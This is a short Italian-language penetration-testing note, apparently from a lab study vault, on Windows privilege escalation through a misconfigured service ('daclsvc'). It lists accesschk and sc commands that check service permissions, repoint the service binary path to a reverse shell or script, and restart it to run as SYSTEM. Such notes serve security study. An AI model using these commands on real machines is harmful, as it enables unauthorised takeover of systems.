### **Controlla i permessi del tuo utente su un servizio**
```powershell
accesschk.exe /accepteula -uwcqv <USER> <SERVICE>
```
![[Pasted image 20230503143654.png]]

==OCCHIO AI PERMESSI DI START E STOP (RIAVVIO DEL SERVIZIO)==

In questo caso c'è il permesso di cambiare i config del servizio
<h3>SERVICE_CHANGE_CONFIG</h3>
query il servizio
```powershell
sc qc daclsvc
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/2.png)
Il servizio runna come system (SERVICE_START_NAME)
Modifica il BINARY_PATH_NAME in modo che punti ad una reverse shell o ad uno script personalizzato
```powershell
sc config daclsvc binpath= "\"<PATH>""
```
e restarta il servizio
```powershell
net start daclsvc
```